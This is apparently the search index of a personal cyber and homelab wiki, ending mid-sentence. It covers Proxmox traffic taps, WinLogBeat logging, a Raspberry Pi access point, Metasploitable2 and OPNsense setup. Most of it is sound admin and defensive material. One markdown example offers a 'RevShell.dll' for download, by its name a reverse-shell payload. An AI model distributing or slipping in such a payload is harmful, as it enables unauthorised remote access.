{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"about/","title":"About","text":""},{"location":"about/#about-rgbwiki","title":"About RGBwiki","text":"<ul> <li>This project is aimed at being a public resource, as well as an aggregate of the knowledge I have gained throughout my time in the field of Cyber and IT (as broad and buzzwordy of a statement as that is).</li> <li>Unfortunately, I'm starting this project a couple years late, meaning some subjects are much less documented than others.</li> </ul>"},{"location":"about/#wiki-usage","title":"Wiki Usage","text":"<ul> <li>Another intent is for this repository to able to be utilized and interacted with as easily as possible; whether it be via the public facing website, via a personal Obsidian vault, or via a locally hosted MkDocs instance.</li> </ul>"},{"location":"about/#usage-via-the-website","title":"Usage via the Website","text":"<ul> <li>(1) Navigate to: https://rgbwiki.com</li> <li>(2) Profit.</li> </ul>"},{"location":"about/#usage-via-obsidian","title":"Usage via Obsidian","text":"<ul> <li>(1) Download the repository from GitHub.</li> </ul> <pre><code># Clone Me\ngit clone https://github.com/tylerdotrar/RGBwiki\n</code></pre> <ul> <li>(2) Open the repository as a Vault in Obsidian.</li> </ul> <ul> <li>(3) Profit.</li> </ul>"},{"location":"about/#usage-via-a-local-mkdocs-instance","title":"Usage via a Local MkDocs Instance","text":"<ul> <li>(1) Download the repository from GitHub.</li> </ul> <pre><code># Clone Me\ngit clone https://github.com/tylerdotrar/RGBwiki\n</code></pre> <ul> <li>(2) Install the MkDocs dependencies.</li> </ul> <pre><code>pip install -r requirements.txt\n</code></pre> <ul> <li>(3) Serve the vault locally on port 8000.</li> </ul> <pre><code># From within the root RGBwiki directory\nmkdocs serve\n\n# Windows systems might require this syntax\npython -m mkdocs serve\n</code></pre> <p> (Ignore the warning messages.  They stem from my implementation of a custom home page.)</p>"},{"location":"Blue%20Cell/","title":"Blue Cell Overview","text":"<p>Info</p> <p>Blue Cell\u00a0| Everything security &amp; analytics.</p>"},{"location":"Blue%20Cell/Tapping%20Proxmox%20VMs%20and%20LXCs/","title":"Tapping Proxmox VMs and LXCs","text":""},{"location":"Blue%20Cell/Tapping%20Proxmox%20VMs%20and%20LXCs/#overview","title":"Overview","text":"<p>This page will cover some simple TC scripts made to TAP VM/LXC network interfaces on Linux based hypervisors (e.g., Proxmox).  These scripts are also hosted on my tc-taps repository.</p>"},{"location":"Blue%20Cell/Tapping%20Proxmox%20VMs%20and%20LXCs/#tutorial","title":"Tutorial","text":"<p>Every VM/LXC has a network TAP interface based on their ID's and interface(s).</p> <pre><code># Proxmox Virtual Machine Example\nVM Example:      ID: 125 ; net0: vmbr0, net1: vmbr5\nNetwork Tap(s):  tap125i0, tap125i1\n\n# Proxmox LXC Example:\nLXC Example:     ID: 203 ; net0: vmbr9\nNetwork Tap(s):  veth203i0\n</code></pre> <p>You can search for these tap interfaces by running the following command on your Proxmox host:</p> <pre><code># View available taps\nip --brief a | grep 'tap\\|veth' | sed 's/@.*//g' | awk '{print $1}'\n</code></pre> <p>To tap these machines you will need to...</p> <ol> <li>Create a virtual bridge to be used as a SPAN port (e.g., vmbr100).<ul> <li><code>Select Node --&gt; System --&gt; Network --&gt; Create --&gt; Linux Bridge</code></li> <li>Note: The SPAN port should have no IP, gateway, etc.</li> </ul> </li> <li>Add the created bridge to a SecurityOnion VM and use that bridge as the SPAN port.</li> <li>Run the below \"tc_up\" script on the Proxmox host, specifying desired ID range to TAP and pointing to that created bridge.</li> </ol> <pre><code>#!/bin/bash\n\n# Author: Tyler McCann (@tylerdotrar)\n# Arbitrary Version Number: 1.1.1\n# Link: https://github.com/tylerdotrar/tc-taps\n\n# TAP any VM/LXC with an ID containing a specified value (e.g., 1001 - 1099 range).\nID_RANGE=10\n\n# Virtual SPAN port to mirror traffic to.\nSPAN_PORT='vmbr100'\n\n# Add TAP(s) for above ID range to a 'network_taps' file.\nip --brief a | grep \"tap\\|veth\" | sed 's/@.*//g' | grep $ID_RANGE | awk '{print $1}' &gt; network_taps\n\n###\n#    *OR* you can manually include specific ID's.\n#\n#    echo tap&lt;id_1&gt;i0 &gt; network_taps\n#    echo veth&lt;id_2&gt;i0 &gt;&gt; network_taps\n###\n\necho \"Enabling TC Network TAP(s):\"\n\n# Read every TAP interface in 'network_taps' and forward traffic to the designated SPAN port\nwhile read i;\ndo\n    echo \"- $i\"\n\n    # Capture Ingress Traffic\n    tc qdisc add dev $i ingress\n    tc filter add dev $i parent ffff: protocol all u32 match u8 0 0 action mirred egress mirror dev $SPAN_PORT\n\n    # Capture Egress Traffic (thx @nukingdragons)\n    tc qdisc add dev $i handle 1: root prio\n    tc filter add dev $i parent 1: protocol all u32 match u8 0 0 action mirred egress mirror dev $SPAN_PORT\ndone &lt; network_taps\n</code></pre>"},{"location":"Blue%20Cell/WinLogBeat%20Host%20Collection/","title":"WinLogBeat Host Collection","text":"<p>Original note created: 25JAN2023</p> <ul> <li>These notes are for setting up host collection using WinLogBeat with SecurityOnion.</li> <li>This page will be updated and enriched in the future.</li> </ul> <pre><code>[+] Download sysmon, and utilize below config file:\nhttps://download.sysinternals.com/files/Sysmon.zip\nhttps://github.com/SwiftOnSecurity/sysmon-config\n\nSyntax:\n.\\sysmon64.exe -i .\\sysmonconfig-export.xml\n\n\n[+] Download Winlogbeat directly from the SOC to make sure the host and server are using the same versions\n\n\n[+] Run 'sudo so-allow' on SO and set Logstash Beat (5044/tcp) to allow traffic from anything within the desired subnet.\n\n\n[+] Navigate to \"C:\\ProgramData\\Elastic\\Beats\\winlogbeat\"\n\n\n[+] Copy 'winlogbeat.example.yml' to 'winlogbeat.yml' and modify it to:\n\n``\n#=== Winlogbeat specific options ===\nwinlogbeat.event_logs:\n  - name: Application\n    ignore_older: 72h\n  - name: System\n  - name: Security\n  - name: Microsoft-Windows-Sysmon/Operational\n  - name: Microsoft-Windows-PowerShell/Operational\n\n#--- Elasticsearch Output ---\n#output.elasticsearch\n  # Array of hosts to connect to\n  # hosts: [\"localhost:9200\"]\n\n#=== Logstash output ===\noutput.logstash:\n  # The Logstash hosts\n  hosts: [\"&lt;SECONION_NAME&gt;:5044\"]\n``\n\nNote:\nMake sure you specify the SecOnion name IF you setup DNS resolution/FQDN.\nIf you didn't, use the IP -- this can make or break host collection.\n\n[+] Start 'Elastic Winlogbeat-Oss' service.\n</code></pre>"},{"location":"Green%20Cell/","title":"Green Cell Overview","text":"<p>Info</p> <p>Green Cell\u00a0| Everything Infrastructure &amp; DevOps</p>"},{"location":"Green%20Cell/#01-infrastructure","title":"01. Infrastructure","text":"<ul> <li>Collection of notes dedicated to covering installation, deployment, and usage (both common and niche) of different pieces of key infrastructure (e.g., OPNsense, Proxmox, Security Onion, etc.).</li> </ul>"},{"location":"Green%20Cell/#02-services","title":"02. Services","text":"<ul> <li>Collection of notes dedicated to installation and deployment of different services and servers that can easily be installed on a hypervisor (e.g., Passbolt, PiHole, Stable Diffusion, Minecraft, etc.) The current collection have all been developed for and tested on Proxmox LXCs using an Ubuntu 20.04 image.</li> </ul>"},{"location":"Green%20Cell/#03-wip-range-development","title":"03. (WIP) Range Development","text":"<ul> <li>This section is still in development, but eventually will contain walkthroughs for automated range development, from GHOSTS user emulation to CloudInit network and domain configurations.</li> </ul>"},{"location":"Green%20Cell/#04-github-pages","title":"04. Github Pages","text":"<ul> <li>Simple collection of notes dedicated to the deployment of static sites using Github Pages.</li> </ul>"},{"location":"Green%20Cell/#05-general-cli-functions","title":"05. General CLI Functions","text":"<ul> <li>Broad collection of simple cheatsheets covering common functionality of different tools and systems (e.g., neovim, i3, etc.).</li> </ul>"},{"location":"Green%20Cell/#06-tool-cheatsheets","title":"06. Tool Cheatsheets","text":"<ul> <li>Broad collection of simple cheatsheets covering common functionality of different tools and systems (e.g., neovim, i3, etc.).</li> </ul>"},{"location":"Green%20Cell/Markdown%20Etiquete/","title":"Markdown Etiquete","text":""},{"location":"Green%20Cell/Markdown%20Etiquete/#tables","title":"Tables","text":"Category 1 Category 2 Category 3 Example <code>Example</code> Longer example here. Example <code>Example</code> Longer example here. Example <code>Example</code> Longer example here."},{"location":"Green%20Cell/Markdown%20Etiquete/#checklists","title":"Checklists","text":"<ul> <li> Thingy 1</li> <li> Thingy 2</li> <li> Thingy 3</li> </ul>"},{"location":"Green%20Cell/Markdown%20Etiquete/#message-blocks-callouts","title":"Message Blocks (Callouts)","text":"<p>Info</p> <p>Information here. Alises: N/A</p> <p>Todo</p> <p>To-do list here. Alises: N/A</p> <p>Tip</p> <p>Important info here! Aliases: <code>hint</code>, <code>important</code></p> <p>Success</p> <p>Success here! Aliases: <code>check</code>, <code>done</code></p> <p>Question</p> <p>Freqently asked questions! Aliases: <code>help</code>, <code>faq</code></p> <p>Warning</p> <p>Warning here! Aliases: <code>caution</code>, <code>attention</code></p> <p>Failure</p> <p>Failure here! Aliases: <code>fail</code>, <code>missing</code></p> <p>Danger</p> <p>Bruh!!! Aliases: N/A</p> <p>Bug</p> <p>Known bugs here! Aliases: N/A</p> <p>Example</p> <p>Example here! Aliases: N/A</p> <p>Quote</p> <p>Quote here! Aliases: N/A</p> <p>Example:</p> Guess what? <p>[!example] Callouts can be renamed...</p> <p>[!tip] ... and nested!</p> <p>The following are GitHub README compatible:</p> <p>Note</p> <p>Highlights information that users should take into account, even when skimming.</p> <p>Tip</p> <p>Crucial information necessary for users to succeed.</p> <p>Warning</p> <p>Critical content demanding immediate user attention due to potential risks.</p>"},{"location":"Green%20Cell/Markdown%20Etiquete/#diagrams","title":"Diagrams","text":"<pre><code>graph TD;\n    A[Originator] --&gt; B[Route 1];\n    A --&gt; C[Route 2];\n    B --&gt; D[Finish];\n    C --&gt; D;</code></pre> <pre><code>flowchart LR\n\nA[Hard] --&gt;|Text| B(Round)\nB --&gt; C{Decision}\nC --&gt;|One| D[Result 1]\nC --&gt;|Two| E[Result 2]</code></pre> <pre><code>gantt\n    section Section\n    Completed :done,    des1, 2014-01-06,2014-01-08\n    Active        :active,  des2, 2014-01-07, 3d\n    Parallel 1   :         des3, after des1, 1d\n    Parallel 2   :         des4, after des1, 1d\n    Parallel 3   :         des5, after des3, 1d\n    Parallel 4   :         des6, after des4, 1d</code></pre> <pre><code>pie\n\"Dogs\" : 386\n\"Cats\" : 85.9\n\"Rats\" : 15</code></pre>"},{"location":"Green%20Cell/Markdown%20Etiquete/#code-blocks","title":"Code Blocks","text":"<pre><code>#!/bin/bash\necho \"yo momma\"\n</code></pre> <pre><code># PowerShell\nGet-ChildItem \"C:\\Windows\\system32\"\n</code></pre> <pre><code>// Rust\nfn main() {\n    println!(\"Hello World!\");\n}\n</code></pre> <pre><code>// C#\nnamespace HelloWorld\n{\n    class Hello {         \n        static void Main(string[] args)\n        {\n            System.Console.WriteLine(\"Hello World!\");\n        }\n    }\n}\n</code></pre>"},{"location":"Green%20Cell/Markdown%20Etiquete/#embedding-images-videos","title":"Embedding Images &amp; Videos","text":"<p>URL Encoded Format <pre><code># Locally Hosted Image\n![](file://&lt;absolute_file_path_url_encoded&gt;)\n\n# Web Hosted Image\n![](http(s)://&lt;image_url&gt;\n</code></pre></p>"},{"location":"Green%20Cell/Markdown%20Etiquete/#file-download-support","title":"File Download Support","text":"<pre><code># Download a file from a local 'downloads' directory\n[link](downloads/filename.exe){:download=\"filename.exe\"}\n</code></pre> <p>Info</p> <p>Download RevShell.dll here.</p>"},{"location":"Green%20Cell/01.%20Infrastructure/","title":"Infrastructure","text":"<ul> <li>Collection of notes dedicated to covering installation, deployment, and usage (both common and niche) of different pieces of key infrastructure (e.g., OPNsense, Proxmox, Security Onion, etc.).</li> </ul>"},{"location":"Green%20Cell/01.%20Infrastructure/#table-of-contents","title":"Table of Contents","text":""},{"location":"Green%20Cell/01.%20Infrastructure/#miscellaneous","title":"Miscellaneous","text":"<ul> <li>Bridged Wi-Fi Access Point on a RaspberryPi</li> <li>Installing i3 on Kali Linux</li> <li>Installing Metasploitable2 on Proxmox</li> </ul>"},{"location":"Green%20Cell/01.%20Infrastructure/#opnsense","title":"OPNsense","text":"<ul> <li>(To-Do) Setting up a Wireguard VPN</li> <li>Creating Internal CA's and Certificates</li> <li>Installation</li> <li>NordLynx Wireguard Configuration</li> </ul>"},{"location":"Green%20Cell/01.%20Infrastructure/#proxmox","title":"Proxmox","text":"<ul> <li>1. Installation</li> <li>2. Storage Configuration</li> </ul>"},{"location":"Green%20Cell/01.%20Infrastructure/#notes","title":"Notes","text":"<ul> <li>Adding CPU Temperature Readings to Summary</li> <li>CLI Information &amp; Helpers</li> <li>Enabling IOMMU</li> <li>GPU Passthrough</li> <li>Remove Subscription Message</li> <li>Virtual Machine Best Practices</li> <li>VLAN Support</li> </ul>"},{"location":"Green%20Cell/01.%20Infrastructure/#security-onion","title":"Security Onion","text":"<ul> <li>1. Installation</li> </ul>"},{"location":"Green%20Cell/01.%20Infrastructure/Miscellaneous/Bridged%20Wi-Fi%20Access%20Point%20on%20a%20RaspberryPi/","title":"Bridged Wi Fi Access Point on a RaspberryPi","text":""},{"location":"Green%20Cell/01.%20Infrastructure/Miscellaneous/Bridged%20Wi-Fi%20Access%20Point%20on%20a%20RaspberryPi/#overview","title":"Overview","text":"<p>Raspberry Pi's are small, (ideally) inexpensive single-board computers that are commonly utilized for affordable, modular computing projects (e.g., internal DNS, media servers, Wi-Fi access points, etc.).</p> <p>Setting up a Wi-Fi access point (AP) is fairly easy, and can provide an interesting learning experience.  There are two types of AP's you can configure: <code>bridged</code> and <code>routed</code>.</p> <p>A bridged AP simply bridges hosts to the wired network, sharing the DHCP server used/reachable by the Access Point.  Whereas a routed AP would act as router and NAT hosts that connect to it.</p> <p>Info</p> <p>Official documentation can be found here: https://www.raspberrypi.com/documentation/computers/configuration.html#setting-up-a-bridged-wireless-access-point</p>"},{"location":"Green%20Cell/01.%20Infrastructure/Miscellaneous/Bridged%20Wi-Fi%20Access%20Point%20on%20a%20RaspberryPi/#configuration","title":"Configuration","text":"<p>The entire script below is not completely ready to be copy and pasted due to usage of <code>nano</code>. Recommend following along manually.</p> <pre><code># Variables (change accordingly)\nethernetInt=\"eth0\"\nethernetIP=\"xx.xx.xx.xx/24\"\nethernetGateway=\"xx.xx.xx.xx\"\nethernetDNS=\"xx.xx.xx.xx xx.xx.xx.xx\"\n\nwirelessInt=\"wlan0\"\nssid=\"&lt;ssid&gt;\"\npass=\"&lt;password&gt;\"\n\n\n# Updates and Dependencies\nsudo apt update &amp;&amp; sudo apt upgrade -y\nsudo apt install hostapd\n\n\n# Enable systemctl on start\nsudo systemctl unmask hostapd\nsudo systemctl enable hostapd\n\n\n# Create a Bridge device\nsudo echo \"[NetDev]\nName=br0\nKind=bridge\n\" &gt; /etc/systemd/network/bridge-br0.netdev\n\n\n# Add ethernet interface to bridge\nsudo echo \"[Match]\nName=${ethernetInt}\n\n[Network]\nBridge=br0\n\" &gt; /etc/systemd/network/br0-member-${ethernetInt}.network\n\n\n# Enable service to populate bridge on boot\nsudo systemctl enable systemd-networkd --now\n\n\n# (WIP) Add following lines above first \"interface xxx\" line\nsudo nano /etc/dhcpcd.conf\n`\n# Added for AP configuration (1).\ndenyinterfaces ${wirelessInt} ${ethernetInt}\n`\n\n\n# Add folling lines at the end of the file\nsudo echo \"# Added for AP configuration (2).\ninterface br0\ninterface ${ethernetInt}\n        static ip_address=${ethernetIP}\n        static routers=${ethernetGateway}\n        static domain_name_servers=${ethernetDNS}\n\" &gt;&gt; /etc/dhcpcd.conf\n\n\n# Ensure WiFi radio is not blocked on the device\nsudo rfkill unblock wlan\n\n\n# Configure Hostapd AP Software\necho \"# Interface in Bridged AP Mode\ncountry_code=US\ninterface=${wirelessInt}\nbridge=br0\nmacaddr_acl=0\n\n# 5GHz\n#hw_mode=a\n#channel=153\n\n# 2.4GHz\nhw_mode=g\nchannel=7\n\n# Authorization\nignore_broadcast_ssid=0\nauth_algs=1\nwpa=2\nssid=${ssid}\nwpa_passphrase=${pass}\nwpa_key_mgmt=WPA-PSK\nwpa_pairwise=TKIP\nrsn_pairwise=CCMP\n\n# Hopefully Improve Speeds\nieee80211ac=1\nwmm_enabled=1\nrequire_ht=1\nrequire_vht=1\n\" &gt; /etc/hostapd/hostapd.conf\n\n\n# Reboot\nsudo systemctl reboot\n</code></pre>"},{"location":"Green%20Cell/01.%20Infrastructure/Miscellaneous/Installing%20Metasploitable2%20on%20Proxmox/","title":"Installing Metasploitable2 on Proxmox","text":""},{"location":"Green%20Cell/01.%20Infrastructure/Miscellaneous/Installing%20Metasploitable2%20on%20Proxmox/#overview","title":"Overview","text":"<p>Metasploitable2 is an intentionally vulnerable Ubuntu Linux virtual machine that is designed for testing common vulnerabilities.  It allows for a secure and free way to perform penetration testing and security research on a local target.  By default, this virtual machine (VM) is compatible with VMWare, VirtualBox, and other common virtualization platforms.</p> <p>By default, the VM is not compatible with Proxmox because it is a <code>.vmdk</code> image.  Luckily, Proxmox has some utilities that can be used to convert the <code>.vmdk</code> image to a working <code>.qcow2</code> image.</p>"},{"location":"Green%20Cell/01.%20Infrastructure/Miscellaneous/Installing%20Metasploitable2%20on%20Proxmox/#installation","title":"Installation","text":"<p>The following installation should be done from your Proxmox node's terminal, and the only dependency should be <code>unzip</code>.</p> <pre><code># Variables (change accordingly)\nvm_id=\"&lt;target_vm_id&gt;\"\nvm_name=\"Metasploitable2\"\nvm_bridge=\"vmbr0\"\nvm_bootdisk=\"ide0\"\nstorage_volume=\"local\"\n\n# Download and unzip Metasploitable2 Image\nwget https://sourceforge.net/projects/metasploitable/files/Metasploitable2/metasploitable-linux-2.0.0.zip\nunzip metasploitable-linux-2.0.0.zip\ncd Metasploitable2-Linux/\n\n# Create a new qcow2 storage disk\nqemu-img convert -O qcow2 Metasploitable.vmdk metasploitable.qcow2\n\n# Create a new VM using qcow2 storage disk\nqm create $vm_id --memory 2048 --cores 2 --name $vm_name --net0 virtio,bridge=${vm_bridge} --boot c --bootdisk $vm_bootdisk\n\n# Import qcow storage disk to target storage volume\nqm importdisk $vm_id metasploitable.qcow2 $storage_volume\n\n# Set VM's storage disk to the imported disk\n# - Note: snapshots won't work because the storage is '.raw'\nqm set $vm_id --ide0 local:${vm_id}/vm-${vm_id}-disk-0.raw\n</code></pre>"},{"location":"Green%20Cell/01.%20Infrastructure/Miscellaneous/Installing%20i3%20on%20Kali%20Linux/","title":"Installing i3 on Kali Linux","text":""},{"location":"Green%20Cell/01.%20Infrastructure/Miscellaneous/Installing%20i3%20on%20Kali%20Linux/#overview","title":"Overview","text":"<p>i3 is a Linux window tiling manager; effectively a Linux desktop environment that's stripped down to its absolute minimum. While appearing to be counterintuitive, it's targeted at developers and enthusiast users to optimize speed and efficiency.  Similar to <code>vim</code>, familiarity with a tiling manager can improve productivity and workflow speeds.</p> <p>Installing i3 on Kali Linux is a little more involved than other, more barebones distributions.  Because of that, some installation scripts can be utilized.</p>"},{"location":"Green%20Cell/01.%20Infrastructure/Miscellaneous/Installing%20i3%20on%20Kali%20Linux/#installation-via-cleanbuilds","title":"Installation via CleanBuilds","text":"<p>Info</p> <p>My CleanBuilds repository can be found here.</p> <pre><code># Installation\ngit clone https://github.com/tylerdotrar/CleanBuilds\ncd CleanBuilds/kali-i3\nchmod +x build.sh\n\n# Script Usage\n./build.sh\n</code></pre> <p></p>"},{"location":"Green%20Cell/01.%20Infrastructure/Miscellaneous/Installing%20i3%20on%20Kali%20Linux/#installation-via-kali-i3-endeavour","title":"Installation via Kali-i3-Endeavour","text":"<p>Info</p> <p>Mesumine's kali-i3-endeavour repository can be found here.</p> <pre><code># Installation\ngit clone https://github.com/Mesumine/kali-i3-endeavour.git \ncd kali-i3-endeavour \nchmod +x install.sh\n\n# Script Usage\n'./install.sh -a'                 to install all optional programs, aimed at full installation\n'./install.sh -m -v'              to install only required programs, aimed at Virtual machine\n'./install.sh -c list.txt -v -b'  to install optional programs from list, aimed at VM, with Alt as bind key\n\n -a             Install and configure all optional packages.\n -m             Install and configure only the required packages.\n -b             Change bind key from Windows to Alt.\n -c &lt;list.txt&gt;  Install and configure the packages in the list in addition to the required packages.\n -v             Configure towards VM. change $mod+g to $mod+Shift+g. change $mod+l to $mod+Shift+l\n -h             Print help.\n\nThe optional programs are:\nFlameshot :  a screen capture tool that can grab sections of the screen and edit on the fly.\nneovim    :  hyperextensible Vim-based editor. Also comes with custom config file.\npicom     :  a lightweight compositor for x11. Will be used for transparent terminals\narandr    :  gui interface for xrandr. used for changing display settings\n</code></pre> <p></p>"},{"location":"Green%20Cell/01.%20Infrastructure/OPNsense/%28To-Do%29%20Setting%20up%20a%20Wireguard%20VPN/","title":"(To Do) Setting up a Wireguard VPN","text":"<p>Info</p> <p>This note is still in development.</p>"},{"location":"Green%20Cell/01.%20Infrastructure/OPNsense/Creating%20Internal%20CA%27s%20and%20Certificates/","title":"Creating Internal CA's and Certificates","text":""},{"location":"Green%20Cell/01.%20Infrastructure/OPNsense/Creating%20Internal%20CA%27s%20and%20Certificates/#overview","title":"Overview","text":"<p>Often times we want to switch to HTTPS for web services that we input sensitive information into, or to simply make our homelab services look and feel robust.  While invalid certificates still provide encryption and accomplish the first goal of sensitive information encryption, they sure do look ugly.</p> <p></p> <p>An easy method of achieving this superficial goal is by using OPNsense as an internal Certificate Authority (CA) and generating internal server certificates for our hosted services.</p>"},{"location":"Green%20Cell/01.%20Infrastructure/OPNsense/Creating%20Internal%20CA%27s%20and%20Certificates/#internal-certificate-authorities-cas","title":"Internal Certificate Authorities (CA's)","text":"<p>Within OPNsense, go to <code>System &gt; Trust &gt; Authorities</code>.  From here, we will create an internal Certificate Authority (Root CA) and an intermediate Certificate Authority (Intermediate CA). - You only need a root CA for your services to properly work over HTTPS, but adding the intermediate is more secure and is a better security practice.</p> <p>Example Root CA: <pre><code>Descriptive Name:               &lt;domain&gt; Root CA\nMethod:                         'Create an internal Certificate Authority'\nLifetime (days):                3650 (ten years)\nDistinguished Name:             &lt;arbitrary_data&gt;\nCommon Name:                    &lt;domain&gt;.ca\n</code></pre></p> <p>Example Intermediate CA: <pre><code>Descriptive Name:               &lt;domain&gt; Intermediate CA\nMethod:                         'Create an intermediate Certificate Authority'\nSigning Certificate Authority:  &lt;domain&gt; Root CA\nLifetime (days):                3650 (ten years)\nDistinguished Name:             &lt;arbitrary_data&gt;\nCommon Name:                    opnsense.&lt;domain&gt;.ca\n</code></pre></p> <p></p> <p>Once your certificate authorities are created, download both of your CA certificates and CA private keys.  We will need to import these into our system and/or browser to authenticate the certificates that our services will later provide.</p> <p></p> <p>One method to import these certificates is to go to your Brower's settings and search for \"certificates\".  From there, <code>Manage Device Certificates --&gt; Trusted Root Certification Authorities / Intermediate Certification Authorities --&gt; Import...</code></p> <p></p> <p>Once your Certificate Authorities have been imported, you can save the certificates and keys to a safe location and remove the Root CA.  - It is a best practice for the Root CA to remain offline and for the intermediate certificate to be used to issue certificates.</p>"},{"location":"Green%20Cell/01.%20Infrastructure/OPNsense/Creating%20Internal%20CA%27s%20and%20Certificates/#internal-service-certificates","title":"Internal Service Certificates","text":"<p>Next we create the server certificate for our desired internal service. Go to <code>System --&gt; Trust --&gt; Certificates</code> and click the the drop down.\u00a0</p> <p></p> <p>And fill out the information like so.</p> <p>Example Server Certificate: <pre><code>Method:                 'Create an inteneral Certificate'\nDescriptive Name:       &lt;service_name&gt; Certificate\nCertificate Authority:  &lt;domain&gt; Intermediate CA\nType:                   'Server Certificate'\nLifetime (days):        3650 (10 years)\nDistinguished Name:     &lt;arbitrary_data&gt;\nCommon Name:            &lt;service_name&gt;.&lt;domain&gt;\nAlternative Names:      DNS:  &lt;dns_record&gt;\n                        IP:   &lt;ip_address&gt;\n                        URI:  https://&lt;dns_record&gt;:&lt;port&gt;\n</code></pre></p> <p></p> <p>Once you have your internal certificate created, export both your cert and key to move to your intended server and configure accordingly.</p> <p></p>"},{"location":"Green%20Cell/01.%20Infrastructure/OPNsense/Installation/","title":"Installation","text":""},{"location":"Green%20Cell/01.%20Infrastructure/OPNsense/Installation/#overview","title":"Overview","text":"<p>OPNsense is an open source, FreeBSD-based firewall and routing software that started as a fork of pfSense with aims to be a more secure, performant, and user friendly alternative.</p> <p>For our use-case, it provides an intuitive user interface that allows easy configuration of DHCP, static mappings, and registering mappings/leases into UnboundDNS for local name resolution.</p>"},{"location":"Green%20Cell/01.%20Infrastructure/OPNsense/Installation/#installation-configuration","title":"Installation &amp; Configuration","text":"<p>The installation process will be broken into two components:</p> <ul> <li>Creation of the OPNsense VM on Proxmox</li> <li>Installation &amp; configuration of the OPNsense software</li> </ul>"},{"location":"Green%20Cell/01.%20Infrastructure/OPNsense/Installation/#virtual-machine-creation","title":"Virtual Machine Creation","text":"<p>After your primary Proxmox node has been installed and configured, you will need to upload an OPNsense ISO (available at\u00a0https://opnsense.org/download/\u00a0-- for our use-case we are using a DVD image on amd64 architecture).</p> <p>For this VM configuration, if a component wasn't specified then assume the default values are sufficient.</p> <ol> <li> <p>Give the VM 1 CPU core, and change\u00a0\"Type\"\u00a0from\u00a0<code>Default (kvm64)</code>\u00a0to\u00a0<code>host</code>\u00a0for maximum CPU performance.     (For more information on CPU types,\u00a0https://pve.proxmox.com/pve-docs/chapter-qm.html#qm_cpu) </p> </li> <li> <p>Select\u00a0\"No network device\"\u00a0because we will PCI passthrough a physical NIC post VM creation. </p> </li> <li> <p>After the VM was created (but before it is started), navigate to the\u00a0Hardware\u00a0menu and\u00a0Add\u00a0a PCI device. Select your desired PCIe 2-port Gigabit ethernet -- for our use-case it was device\u00a0<code>0000:03:00.0</code> </p> </li> </ol> <p>IMPORTANT:\u00a0make sure to select\u00a0\"All Functions\"\u00a0for the PCI device, otherwise you won't be able to use both ports for WAN/LAN configuration.</p>"},{"location":"Green%20Cell/01.%20Infrastructure/OPNsense/Installation/#tldr","title":"TL;DR","text":"<ul> <li>1 CPU core (w/ CPU type set to\u00a0<code>host</code>\u00a0for maximum performance)</li> <li>2048MB RAM</li> <li>32GB Storage</li> <li>No (virtual) network device</li> <li>PCI Passthrough of 2-port Gigabit Ethernet (w/\u00a0\"All Functions\"\u00a0selected)</li> </ul>"},{"location":"Green%20Cell/01.%20Infrastructure/OPNsense/Installation/#troubleshooting","title":"Troubleshooting","text":"<p>If you're getting the status\u00a0<code>\"Error: cannot prepare PCI pass-through, IOMMU not present\"</code>\u00a0in Proxmox, there are a few more steps you will need to do to enable IOMMU. For more in-depth information, check out the PCI Passthrough documentation in the Proxmox Wiki\u00a0https://pve.proxmox.com/wiki/Pci_passthrough.</p> <p>For our use-case, we need to:</p> <ul> <li>Modify\u00a0<code>/etc/default/grub</code>\u00a0and set\u00a0GRUB_CMDLINE_LINUX_DEFAULT=\"intel_iommu=on\"</li> <li>Modify\u00a0<code>/etc/kernel/cmdline</code>\u00a0and add\u00a0quiet intel_iommu=on</li> <li><code>update-grub</code></li> <li><code>proxmox-boot-tool refresh</code></li> <li>Restart the Proxmox node</li> <li>IOMMU should now be enabled, and to check you can run the command:\u00a0<code>dmesg | grep -e DMAR -e IOMMU</code></li> </ul> <p></p>"},{"location":"Green%20Cell/01.%20Infrastructure/OPNsense/Installation/#opnsense-configuration","title":"OPNsense Configuration","text":"<p>OPNsense has fairly robust documentation, so for anything not mentioned in this Wiki feel free to consult their documentation at\u00a0https://wiki.opnsense.org/index.html.</p> <p>Upon first boot, login using the\u00a0<code>installer</code>\u00a0credentials to begin installation.</p> <p></p> <pre><code>login: installer\nPassword: opnsense\n</code></pre> <p>Most defaults should be sufficient. We opted for the UFS file system over ZFS due to our limited memory configuration.\u00a0Change your root password.\u00a0Once initial installation is complete, the system should reboot and you'll get access to the following management page (after logging in).</p> <p></p> <p>(Moving forward, if prompts are missing from this wiki, assume\u00a0<code>&lt;ENTER&gt;</code>\u00a0/ no value was input.)</p> <p>First, assign the interfaces (1). For our configuration,\u00a0<code>bge0</code>\u00a0is WAN and\u00a0<code>bge1</code>\u00a0is LAN.</p> <pre><code>Do you want to configure LAGGs now? [y/n]: n\nDo you want to configure VLANs now? [y/n]: n\nEnter the WAN interface name or 'a' for auto-detection: bge0\nEnter the LAN interface name or 'a' for auto-detection: bge1\n</code></pre> <p>Next, set interface IP addresses (2).</p> <p>For WAN:</p> <pre><code>Configure IPv4 address WAN interface via DHCP? [y/n]: n\nEnter the new WAN IPv4 address. Press &lt;ENTER&gt; for none: 192.168.16.30\nEnter the new WAN IPv4 subnet bit count (1 to 32): 24\nFor a WAN, enter the new WAN IPv4 upstream gateway address: 192.168.16.12\nDo you want to use the gateway as the IPv4 name server, too? [y/n]: n\nEnter the IPv4 name server or press &lt;ENTER&gt; for none: 8.8.8.8\nConfigure IPv6 address WAN interface via DHCP6? [y/n]: n\nDo you want to change the web GUI protocol from HTTPS to HTTP? [y/n]: n\nDo you want to generate a new self-signed web GUI certificate? [y/n]: y\nRestore web GUI access defaults? [y/n]: y\n</code></pre> <p>For LAN:</p> <pre><code>Configure IPv4 address LAN interface via DHCP? [y/n]: n\nEnter the new LAN IPv4 address. Press &lt;ENTER&gt; for none: 10.10.1.1\nEnter the new LAN IPv4 subnet bit count (1 to 32): 16\nConfigure IPv6 address LAN interface via WAN tracking? [y/n]: n\nConfigure IPv6 address LAN interface via DHCP6? [y/n]: n\nDo you want to enable the DHCP server on LAN? [y/n]: y\nEnter the start address of the IPv4 client address range: 10.10.100.1\nEnter the end address of the IPv4 client address range: 10.10.100.255\nDo you want to change the web GUI protocol from HTTPS to HTTP? [y/n]: n\nDo you want to generate a new self-signed web GUI certificate? [y/n]: y\nRestore web GUI access defaults? [y/n]: y\n</code></pre> <p></p> <p>Once this initial configuration is complete, you should now have rudimentary internet access, and be able to do all remaining administration/management via the web GUI 